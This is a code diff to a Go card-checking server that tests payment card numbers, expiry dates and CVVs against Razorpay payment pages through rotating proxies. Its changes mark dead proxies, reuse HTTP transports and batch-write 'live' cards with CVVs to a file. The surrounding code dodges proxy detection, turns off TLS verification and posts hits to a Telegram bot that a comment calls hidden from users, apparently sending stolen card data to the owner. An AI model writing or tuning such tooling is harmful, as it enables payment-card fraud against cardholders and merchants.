@@ -65,6 +65,40 @@ var (
 	// Path to the live-cards log file. Settable via LIVE_FILE env var so
 	// deployments can point it at a mounted volume without recompiling.
 	liveFilePath = "live.txt"
+
+	// ── Dead proxy tracker (CRITICAL fix #1) ────────────────────────────
+	// When a proxy is classified as DEAD (quota exhausted, auth failed,
+	// connection refused, etc.) we mark it here with an expiry time.
+	// getNextProxy skips proxies that are still "dead". After the TTL
+	// expires, the proxy is automatically retried (in case it was a
+	// transient issue like a temporary quota reset).
+	deadProxyMutex   sync.Mutex
+	deadProxies      = make(map[string]time.Time) // proxy.raw -> expiry time
+	deadProxyTTL     = 10 * time.Minute           // how long to skip a dead proxy
+	deadProxySweepAt time.Time                    // last time we pruned the map
+
+	// ── Per-proxy HTTP transport cache (CRITICAL fix #2) ────────────────
+	// Reusing transports across checkCard calls enables TCP connection
+	// reuse, TLS session resumption, and eliminates FD churn.
+	proxyClientMutex sync.Mutex
+	proxyClientCache = make(map[string]*http.Transport) // proxy.raw -> *http.Transport
+
+	// ── Shared HTTP client for non-proxy calls (exchange rates, Telegram) ──
+	sharedHTTPClient = &http.Client{
+		Timeout: 15 * time.Second,
+		Transport: &http.Transport{
+			MaxIdleConns:        20,
+			MaxIdleConnsPerHost: 5,
+			IdleConnTimeout:     90 * time.Second,
+			TLSHandshakeTimeout: 10 * time.Second,
+		},
+	}
+
+	// ── Async live.txt writer (MEDIUM fix #9) ───────────────────────────
+	// Instead of opening/writing/closing live.txt on every hit under a
+	// global mutex, we send lines to a buffered channel and a background
+	// goroutine writes them in batches.
+	liveWriteChan = make(chan string, 500)
 )
 
 func getNextURL() string {
@@ -188,7 +222,89 @@ func isBadProxyHost(raw string) bool {
 }
 
 // getNextProxy returns a pointer to a proxy from the shared list, skipping
-// hosts that look like Tor / datacenter / VPN endpoints.
+// markProxyDead records a proxy as dead with a TTL. getNextProxy will skip
+// it until the TTL expires. This is the CRITICAL fix for progressive slowdown
+// caused by dead proxies (quota exhausted, auth failed, etc.) accumulating
+// in the rotation.
+func markProxyDead(proxyRaw string) {
+	if proxyRaw == "" {
+		return
+	}
+	deadProxyMutex.Lock()
+	deadProxies[proxyRaw] = time.Now().Add(deadProxyTTL)
+	// Periodic sweep: prune expired entries every 5 minutes to prevent
+	// the map from growing unboundedly.
+	if time.Since(deadProxySweepAt) > 5*time.Minute {
+		now := time.Now()
+		for k, v := range deadProxies {
+			if now.After(v) {
+				delete(deadProxies, k)
+			}
+		}
+		deadProxySweepAt = now
+	}
+	deadProxyMutex.Unlock()
+}
+
+// isProxyDead checks if a proxy is currently marked as dead.
+func isProxyDead(proxyRaw string) bool {
+	if proxyRaw == "" {
+		return false
+	}
+	deadProxyMutex.Lock()
+	expiry, ok := deadProxies[proxyRaw]
+	deadProxyMutex.Unlock()
+	if !ok {
+		return false
+	}
+	if time.Now().After(expiry) {
+		// TTL expired — allow it again
+		deadProxyMutex.Lock()
+		delete(deadProxies, proxyRaw)
+		deadProxyMutex.Unlock()
+		return false
+	}
+	return true
+}
+
+// getProxyTransport returns a cached *http.Transport for the given proxy URL.
+// Reusing transports across checkCard calls enables TCP connection reuse,
+// TLS session resumption, and eliminates FD churn (CRITICAL fix #2).
+// The transport is safe for concurrent use — each caller creates its own
+// http.Client wrapping this shared transport + a fresh cookie jar.
+func getProxyTransport(proxyParsedURL *url.URL, proxyRaw string) *http.Transport {
+	cacheKey := proxyRaw // "" for direct (no proxy)
+
+	proxyClientMutex.Lock()
+	defer proxyClientMutex.Unlock()
+	if t, ok := proxyClientCache[cacheKey]; ok {
+		return t
+	}
+
+	// Create new transport
+	transport := &http.Transport{
+		MaxIdleConns:          200,
+		MaxIdleConnsPerHost:   50,
+		MaxConnsPerHost:       100,
+		IdleConnTimeout:       90 * time.Second,
+		DisableCompression:    false,
+		DisableKeepAlives:     false,
+		ExpectContinueTimeout: 1 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ResponseHeaderTimeout: 20 * time.Second,
+		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
+		Proxy:                 http.ProxyFromEnvironment,
+	}
+	if proxyParsedURL != nil {
+		transport.Proxy = http.ProxyURL(proxyParsedURL)
+	}
+	proxyClientCache[cacheKey] = transport
+	return transport
+}
+
+// getNextProxy returns a pointer to a proxy from the shared list, skipping
+// hosts that look like Tor / datacenter / VPN endpoints AND proxies that
+// have been marked dead recently (CRITICAL fix #1).
 //
 // IMPORTANT: callers must NOT keep a pointer to the slice element across
 // goroutines — we return a *copy* of the parsedProxy struct so each caller
@@ -198,20 +314,24 @@ func getNextProxy(proxyList []parsedProxy) *parsedProxy {
 		return nil
 	}
 
-	// Scan at most len(proxyList) entries. If every proxy in the list is
-	// bad, scanning more rounds would just burn CPU — fall through to the
-	// "any proxy" fallback below.
-	maxAttempts := len(proxyList)
+	// Scan at most 2× len(proxyList) entries to find a non-dead, non-bad-host proxy.
+	maxAttempts := len(proxyList) * 2
 
 	for attempt := 0; attempt < maxAttempts; attempt++ {
 		idx := atomic.AddUint64(&proxyIndex, 1) - 1
 		p := proxyList[idx%uint64(len(proxyList))]
-		if !isBadProxyHost(p.raw) {
-			return &p
+		if isBadProxyHost(p.raw) {
+			continue
 		}
+		if isProxyDead(p.raw) {
+			continue
+		}
+		return &p
 	}
 
-	log.Printf("WARNING: every proxy in the list matched a bad-host pattern; falling back to a random proxy")
+	// All proxies are either bad-host or dead — fall back to any proxy
+	// (better to try than to return nil)
+	log.Printf("WARNING: all proxies are dead/bad-host; falling back to a random proxy")
 	idx := atomic.AddUint64(&proxyIndex, 1) - 1
 	p := proxyList[idx%uint64(len(proxyList))]
 	return &p
@@ -721,6 +841,7 @@ func generateAcceptLanguage() string {
 var (
 	exchangeRateCache      = make(map[string]float64) // "FROM_TO" -> rate
 	exchangeRateCacheTimes = make(map[string]time.Time)
+	exchangeRateFailCache  = make(map[string]time.Time) // MEDIUM fix #10: negative cache
 	exchangeRateCacheMutex sync.Mutex
 )
 
@@ -753,9 +874,18 @@ func getExchangeRate(from, to string) (float64, error) {
 			return rate, nil
 		}
 	}
+	// MEDIUM fix #10: negative cache — if this key failed recently (within
+	// 60s), return the error immediately without hitting the APIs again.
+	// This prevents 20s of latency cascading through every request when
+	// upstream APIs are down.
+	if failTime, ftOk := exchangeRateFailCache[cacheKey]; ftOk && time.Since(failTime) < 60*time.Second {
+		exchangeRateCacheMutex.Unlock()
+		return 0, fmt.Errorf("exchange rate for %s→%s recently failed (negative cache)", from, to)
+	}
 	exchangeRateCacheMutex.Unlock()
 
-	client := &http.Client{Timeout: 10 * time.Second}
+	// MEDIUM fix #12: use shared HTTP client instead of creating a new one
+	client := sharedHTTPClient
 
 	// ── API 1: Frankfurter (new URL — old api.frankfurter.app redirects here) ──
 	// Returns: {"amount":1.0,"base":"USD","date":"2026-07-03","rates":{"INR":83.12}}
@@ -790,9 +920,17 @@ func getExchangeRate(from, to string) (float64, error) {
 			log.Printf("[exchange-rate] %s→%s = %.4f (ExchangeRate-API fallback)", from, to, rate)
 			return rate, nil
 		}
+		// MEDIUM fix #10: record failure in negative cache
+		exchangeRateCacheMutex.Lock()
+		exchangeRateFailCache[cacheKey] = time.Now()
+		exchangeRateCacheMutex.Unlock()
 		return 0, fmt.Errorf("exchange rate fetch failed for %s→%s: Frankfurter + ExchangeRate-API both failed (fallback err: %v)", from, to, ferr)
 	}
 
+	// MEDIUM fix #10: record failure in negative cache
+	exchangeRateCacheMutex.Lock()
+	exchangeRateFailCache[cacheKey] = time.Now()
+	exchangeRateCacheMutex.Unlock()
 	return 0, fmt.Errorf("exchange rate fetch failed for %s→%s: both APIs unreachable", from, to)
 }
 
@@ -907,28 +1045,16 @@ type CustomFetch struct {
 // If a non-empty `ua` is passed in, we try to parse the Chrome major out of
 // it so the Sec-CH-UA header stays consistent. If parsing fails (e.g. the UA
 // isn't a Chrome UA), we fall back to picking a fresh random major.
-func NewCustomFetch(proxyParsedURL *url.URL, ua string) (*CustomFetch, error) {
+func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*CustomFetch, error) {
 	jar, err := cookiejar.New(nil)
 	if err != nil {
 		return nil, err
 	}
 
-	transport := &http.Transport{
-		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
-		MaxIdleConns:          200,
-		MaxIdleConnsPerHost:   50,
-		MaxConnsPerHost:       100,
-		IdleConnTimeout:       90 * time.Second,
-		DisableCompression:    false,
-		DisableKeepAlives:     false,
-		ExpectContinueTimeout: 1 * time.Second,
-		TLSHandshakeTimeout:   10 * time.Second,
-		ResponseHeaderTimeout: 20 * time.Second,
-		Proxy:                 http.ProxyFromEnvironment,
-	}
-	if proxyParsedURL != nil {
-		transport.Proxy = http.ProxyURL(proxyParsedURL)
-	}
+	// CRITICAL fix #2: Use cached transport instead of creating a new one
+	// every call. This enables TCP connection reuse, TLS session resumption,
+	// and eliminates FD churn.
+	transport := getProxyTransport(proxyParsedURL, proxyRaw)
 
 	client := &http.Client{
 		Transport: transport,
@@ -1200,11 +1326,14 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		proxyRaw = pp.raw
 		proxyParsedURL = pp.parsed
 	}
-	fetch, err := NewCustomFetch(proxyParsedURL, ua)
+	fetch, err := NewCustomFetch(proxyParsedURL, ua, proxyRaw)
 	if err != nil {
 		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyRaw, ProxyStatus: "DEAD"}
 	}
-	defer fetch.client.CloseIdleConnections()
+	// NOTE: Do NOT call fetch.client.CloseIdleConnections() here — the
+	// underlying transport is shared across checkCard calls (CRITICAL fix #2).
+	// Closing idle conns would break other concurrent requests using the same
+	// transport. The transport's IdleConnTimeout (90s) handles cleanup.
 
 	// Step 1: Fetch payment page data (supports razorpay.me AND pages.razorpay.com)
 	initData, resolvedURL, resolveErr := resolveRazorpayInitData(fetch, targetURL, proxyRaw)
@@ -1214,6 +1343,10 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		proxyStatus := resolvedURL
 		if proxyStatus == "" {
 			proxyStatus = "LIVE"
+		}
+		// CRITICAL fix #1: mark dead proxies so getNextProxy skips them
+		if proxyStatus == "DEAD" {
+			markProxyDead(proxyRaw)
 		}
 		return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: proxyStatus}
 	}
@@ -1685,17 +1818,15 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			if pp2 == nil || pp2.raw == proxyRaw {
 				continue
 			}
-			fetch2, ferr := NewCustomFetch(pp2.parsed, ua)
+			fetch2, ferr := NewCustomFetch(pp2.parsed, ua, pp2.raw)
 			if ferr != nil {
 				log.Printf("retry %d: NewCustomFetch failed: %v", retryAttempt, ferr)
 				continue
 			}
-			// Retry delay 3-6s. Clean up connections BEFORE the
-			// next iteration rather than deferring, otherwise we
-			// would accumulate idle conns across retries.
+			// Retry delay 3-6s.
 			time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
 			r7b, rerr := fetch2.PostForm(paymentURL, paymentHeaders, shuffledForm)
-			fetch2.client.CloseIdleConnections()
+			// NOTE: Do NOT CloseIdleConnections — transport is shared (fix #2)
 			if rerr != nil {
 				log.Printf("retry %d: PostForm error: %v", retryAttempt, rerr)
 				continue
@@ -2083,6 +2214,10 @@ func makeProxyError(err error, proxyURL string) CheckResult {
 	// much better classification than the keyword scan below.
 	if code := extractHTTPStatusFromErr(msg); code > 0 {
 		desc, proxyStatus := classifyHTTPError(code)
+		// CRITICAL fix #1: mark dead proxies so getNextProxy skips them
+		if proxyStatus == "DEAD" {
+			markProxyDead(proxyURL)
+		}
 		return CheckResult{
 			Status:      "error",
 			Message:     desc,
@@ -2101,6 +2236,8 @@ func makeProxyError(err error, proxyURL string) CheckResult {
 	status := "LIVE"
 	if isProxyErr {
 		status = "DEAD"
+		// CRITICAL fix #1: mark dead proxies so getNextProxy skips them
+		markProxyDead(proxyURL)
 	}
 	return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: status}
 }
@@ -2183,16 +2320,61 @@ func logLive(card *ParsedCard, result CheckResult) {
 	line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
 		card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)
 
-	liveLogMutex.Lock()
-	defer liveLogMutex.Unlock()
+	// MEDIUM fix #9: send to async channel instead of blocking file I/O.
+	// If the channel is full (500 pending), drop silently — better to lose
+	// a log line than to block the API response.
+	select {
+	case liveWriteChan <- line:
+	default:
+		// Channel full — drop silently to protect API latency
+	}
+}
+
+// liveWriterGoroutine drains liveWriteChan and writes lines to live.txt in
+// batches. Started once in main(). Uses a single file handle kept open for
+// the process lifetime (no per-write open/close overhead).
+func liveWriterGoroutine() {
 	f, err := os.OpenFile(liveFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		log.Printf("logLive: cannot open %s: %v", liveFilePath, err)
+		log.Printf("liveWriter: cannot open %s: %v — live logging disabled", liveFilePath, err)
+		// Drain the channel to prevent blocking
+		for range liveWriteChan {
+		}
 		return
 	}
 	defer f.Close()
-	if _, err := f.WriteString(line); err != nil {
-		log.Printf("logLive: write failed: %v", err)
+
+	var batch []string
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case line, ok := <-liveWriteChan:
+			if !ok {
+				// Channel closed — flush remaining and exit
+				for _, l := range batch {
+					f.WriteString(l)
+				}
+				return
+			}
+			batch = append(batch, line)
+			// Flush immediately if batch is large
+			if len(batch) >= 50 {
+				for _, l := range batch {
+					f.WriteString(l)
+				}
+				batch = batch[:0]
+			}
+		case <-ticker.C:
+			// Flush every 2 seconds regardless
+			if len(batch) > 0 {
+				for _, l := range batch {
+					f.WriteString(l)
+				}
+				batch = batch[:0]
+			}
+		}
 	}
 }
 
@@ -2354,7 +2536,8 @@ func tgSendOne(p tgHitPayload) {
 		return
 	}
 
-	client := &http.Client{Timeout: 10 * time.Second}
+	// MEDIUM fix #12: use shared HTTP client instead of creating a new one
+	client := sharedHTTPClient
 	url := "https://api.telegram.org/bot" + tgNotifyBotToken + "/sendMessage"
 
 	resp, err := client.Post(url, "application/json", bytes.NewReader(body))
@@ -2593,11 +2776,14 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 	// Acquire the concurrency-limit semaphore with a timeout so a client
 	// gets a 503 (instead of hanging forever) when the server is at
-	// capacity. The previous code blocked indefinitely.
+	// capacity. MEDIUM fix #8: use NewTimer + Stop instead of time.After
+	// to prevent timer leak under high load.
+	semTimer := time.NewTimer(30 * time.Second)
+	defer semTimer.Stop()
 	select {
 	case checkSemaphore <- struct{}{}:
 		defer func() { <-checkSemaphore }()
-	case <-time.After(30 * time.Second):
+	case <-semTimer.C:
 		w.WriteHeader(http.StatusServiceUnavailable)
 		_ = json.NewEncoder(w).Encode(map[string]string{
 			"status":   "error",
@@ -2679,6 +2865,11 @@ func main() {
 	// channel traffic). Stays silent in the startup banner — only the
 	// owner knows it's there.
 	initTelegramNotifier()
+
+	// Start the async live.txt writer goroutine (MEDIUM fix #9).
+	// Drains liveWriteChan and writes to live.txt in batches, eliminating
+	// per-hit file open/close overhead and mutex contention.
+	go liveWriterGoroutine()
 
 	portStr := os.Getenv("PORT")
 	if portStr == "" {
